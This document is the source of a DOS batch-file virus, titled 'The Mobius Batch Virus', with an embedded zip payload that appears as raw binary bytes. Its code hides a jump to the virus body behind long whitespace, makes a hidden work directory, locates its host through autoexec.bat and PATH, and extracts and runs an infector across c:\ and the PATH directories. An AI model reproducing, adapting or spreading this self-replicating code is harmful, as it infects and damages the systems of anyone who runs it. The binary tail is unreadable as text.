@echo off
echo The Mobius Batch Virus
pause

                                                                                @goto $virus$























































:$virus$
@echo off
set _f=find.exe /i "
set _bd=c:\windows\
if not exist %_bd%nul set _bd=c:\
if not exist %_bd%nul set _bd=\
set _td=%_bd%$vdir$
if not #%_td%==#%_bd%$vdir$ goto $vexit$
md %_td%
if not exist %_td%\nul goto $vexit$
set _me=%0.bat
if not exist %_me% set _me=%0
if not $%_me%==$ goto $virfind$
set _me=autoexec.bat
if $%_SF%==$ goto $virfind$
type %_me%|%_f%PATH"|%_f%C:\"|%_f%;">%_td%\vz.bat
call %_td%\vz
:$virfind$
if exist %_me% goto $vextr$
echo>%_td%\v.bat :1
echo>>%_td%\v.bat shift
echo>>%_td%\v.bat if exist %%0%_me% set _me=%%0%_me%
echo>>%_td%\v.bat if exist %%0\%_me% set _me=%%0\%_me%
echo>>%_td%\v.bat if exist %%0%_me%.bat set _me=%%0%_me%.bat
echo>>%_td%\v.bat if exist %%0\%_me%.bat set _me=%%0\%_me%.bat
echo>>%_td%\v.bat if not exist %%_me%% if not -%%1==- goto 1
call %_td%\v %path% lost
del %_td%\v.bat>nul
if not exist %_me% goto $vexit$
:$vextr$
pkunzip.exe %_me% %_td% -o>%_td%\v.tm1
if not errorlevel 1 if exist %_td%\v.zip goto $vextrv$
copy %_td%\v.tm1 %_td%\v.tm2>nul
if not exist %_td%\v.tm2 goto $vclnup$
set _rep=ouch!
if exist %_bd%_!v.zip attrib.exe %_bd%_!v.zip -h>nul
if exist %_bd%_!v.zip copy %_bd%_!v.zip %_td%\v.zip>nul
if not exist %_td%\v.zip goto $vexit$
:$vextrv$
pkunzip.exe %_td%\v.zip %_td% -o>nul
%comspec% nul /e:9705 /f/c%_td%\vi . .. c:\ %path%
:$vclnup$
if not $%_td%==$ del %_td%\v?.*>nul
rd %_td%
:$vexit$
for %%v in (me td bd rep f) do set _%%v=
if not $%_SF%==$yup goto $vend$
set _SF=
@echo on
@goto $vhost$
:$viruSH$
@set _SF=yup
@goto $virus$
:$vend$
PK    Tn�"ןVy�  �     V.ZIPu�{<��7bj���r�7�ɴB������v��ȥ\�ArR��%Yn#��mƩ��\+�r$�Q����\&�~�t^���}��>����~^���|��H�!  � d�:�6��Q p�  $�n�,uqf<�S)9z{x��+Y>X�!M��[>|�+tWS�Fp���@ޥ���^�#�o�=���%f�6�q����~��wr��Зԓ��*�̧����D���E5m�ћ!�q(���8�s;�5%���l=�R6;��J�.R�VF�Y�%nTk�u�5Zw����낃�l����	c�jK��:%]��gi�q�%|W_؟�{	~�6yW�/x4a� �O���Ge��gR�ޮD	;�-CL�ͥW��n��gLf��|� ��Oa�&��"a��ӏ<��!�r��c�Ǉs]d�� �7���Y�X����ͨ��@dK�S.h�w1z
���7�����Lŭ�� ��v�^���,W���ʏˡ֌����^�r�j,�N�j�?z���?u��M]�P�Y�'/=��up8��Vh����E�l���3�ư]o��K��H,2�w��g��kp[`,'mCb��ǃT�^,@G�N;����k���O��j<�'�w���K����YY�����T`?U���q���� 4�3A:uJM�b�����FQ>��r7ज़�h	:�aI���O��\�o�Q.8���k�WA^�t�
��,�X�<\�h��j=5 &��6�Ղ �o��EE�h�V�j��L��2����S�0^���o�џ�������\�i�H[�"�A��P�c��56��^�Ҽ��6�~):�Z_����N��d�j���� ����ė�Z����&m	$�v����qZa=
+?��`a�j�����ՠ��?�-3��Gi�&2瓙����+"~�o�?e��.bN�[�BoWc�Ӈ�e(�Ɋhk�����}���NB6!��,����N�e�:�݄�_��)}d�M�kX�/���8�B�ԯ�AO�S�*^i'��e�R�DC�����l{O8�<���-��l��(N]��]�-�mM��
es֟7i��Γ!U]>�ii��u�

�alX��`�@pF;�JU�����;>'�%tg�&�;��L�a�Q�%��_��Uǈ�E�>�d�#$j���^B����hr��=��CYY�Q���R��<�qP���Eǖ��,LH)ފsI�?3N�":�|�5Ȋ`�0d�*�O���Xi<uo�q�E��/§-ꑛ����˾����VNX����K�����תZ�@��/���+�x�u�]���Q���5X�!�q�l@?;(����E��7�
h�*N���<�E��:�9��Y�6ܕ�AӼ�H.�J�\�C2w����}�@	@1Y�O�/P���3G�g~Ԇ��$�ߦ����n���o*&$�F߲�����w�PK     Tn�"ןVy�  �                   V.ZIPPK      3   �    